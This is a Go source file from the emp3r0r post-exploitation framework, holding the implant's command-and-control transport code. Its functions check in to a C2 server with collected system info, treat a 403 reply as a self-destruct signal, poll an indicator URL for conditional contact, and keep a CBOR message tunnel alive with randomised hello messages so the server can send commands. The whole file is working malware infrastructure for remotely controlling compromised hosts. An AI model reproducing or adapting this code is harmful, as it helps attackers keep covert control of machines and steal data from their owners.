package c2transport

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReportStatus poll CC server and report its system info
func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
	prefix := config.C2Prefix
	if prefix == "" {
		prefix = transport.WebRoot
	}
	checkinPath := config.CheckInPath
	if checkinPath == "" {
		checkinPath = "checkin"
	}
	// If UUID is valid, use it.
	// If empty, the checkin will fail with 404 because the URL will be incomplete (/api/checkin/),
	// or the server will reject it. This is intended.
	reportStatusURL := netutil.JoinURL(def.CCAddress, prefix, checkinPath, info.UUID)
	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)

	conn, _, _, err := EstablishC2Connection(reportStatusURL)
	if err != nil {
		if strings.Contains(err.Error(), "bad status code: 403") {
			return fmt.Errorf("self-destruct")
		}
		return err
	}
	defer conn.Close()
	out := cbor.NewEncoder(conn)
	err = out.Encode(info)
	if err == nil {
		logging.Println("Checked in")
	}
	return err
}

// CheckC2Condition check common.RuntimeConfig.CCIndicator for conditional C2 connetion
func CheckC2Condition(proxy string) bool {
	logging.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   60 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 60 * time.Second,
	}
	if proxy != "" && strings.HasPrefix(def.Transport, "HTTP2") {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			logging.Fatalf("invalid proxy: %v", err)
		}
		t.Proxy = http.ProxyURL(proxyUrl)
		logging.Printf("CheckC2Condition: using proxy %s", proxy)
	}
	client := http.Client{
		Transport: t,
		Timeout:   30 * time.Second,
	}
	resp, err := client.Get(common.RuntimeConfig.CCIndicatorURL)
	if err != nil {
		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	_, err = io.ReadAll(resp.Body)
	if err != nil {
		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	select {
	case <-sig:
		logging.Println("Cancelling due to interrupt")
		cancel()
		os.Exit(0)
	case <-ctx.Done():
		signal.Stop(sig)
		return
	}
}

// HandShakes record each hello message and C2's reply
var HandShakes sync.Map // map[string]bool

// MsgTunneler use the connection (conn)
func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) error {
	var (
		in  = cbor.NewDecoder(conn)
		out = cbor.NewEncoder(conn)
	)
	go catchInterruptAndExit(ctx, cancel)
	defer func() {
		go func() {
			if closeErr := conn.Close(); closeErr != nil {
				logging.Print("MsgTunneler closing: ", closeErr)
			}
		}()

		cancel()
		def.KCPKeep = false // tell KCPClient to close this conn so we won't stuck
		logging.Print("MsgTunneler closed")
	}()

	// check for CC server's response
	go func() {
		logging.Println("Check CC response: started")
		defer cancel()
		for ctx.Err() == nil {
			// read response
			// all messages are now structured MsgTunData
			var msg def.MsgTunData
			if decodeErr := in.Decode(&msg); decodeErr != nil {
				if !strings.Contains(decodeErr.Error(), "context canceled") && decodeErr != io.EOF {
					logging.Print("Check CC response: CBOR msg decode: ", decodeErr)
				}
				break
			}

			// if it's a handshake reply
			if msg.Tag == "handshake" {
				HandShakes.Store(msg.CmdID, true)
				continue
			}

			// process CC data; copy to avoid concurrent reuse of msg in next loop
			msgCopy := msg
			go callback(&msgCopy)
		}
		logging.Println("Check CC response: exited")
	}()

	wait_hello := func(hello_id string) bool {
		// delete key, forget about this hello when we are done
		defer HandShakes.Delete(hello_id)
		// wait until timeout or success
		for range config.CCTimeout {
			if ctx.Err() != nil {
				return false
			}
			// if hello marked as success, return true
			isSuccessAny, _ := HandShakes.Load(hello_id)
			isSuccess, _ := isSuccessAny.(bool)
			if isSuccess {
				return true
			}
			time.Sleep(time.Millisecond)
		}
		logging.Warningf("Hello (%s) timeout. Please check your network connection.", hello_id)
		return false
	}

	sendHello := func(cnt int) bool {
		var hello_msg def.MsgTunData
		// try cnt times then exit
		for cnt > 0 {
			if ctx.Err() != nil {
				return false
			}
			cnt-- // consume cnt

			// send hello
			hello_msg.CmdSlice = []string{util.RandStr(util.RandInt(1, 100))}
			hello_msg.CmdID = uuid.NewString()
			hello_msg.Tag = config.AgentTag
			hello_msg.AgentUUID = config.AgentUUID
			hello_msg.AgentUUIDSig = config.AgentUUIDSig
			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
				util.TakeABlink()
				continue
			}
			HandShakes.Store(hello_msg.CmdID, false)
			if !wait_hello(hello_msg.CmdID) {
				cancel()
				break
			}
			return true
		}
		return false
	}

	// keep connected
	for ctx.Err() == nil {
		if !sendHello(util.RandInt(1, 10)) {
			logging.Errorf("sendHello failed")
			break
		}
		util.TakeASnap()
	}

	return fmt.Errorf("MsgTunneler closed: %v", ctx.Err())
}
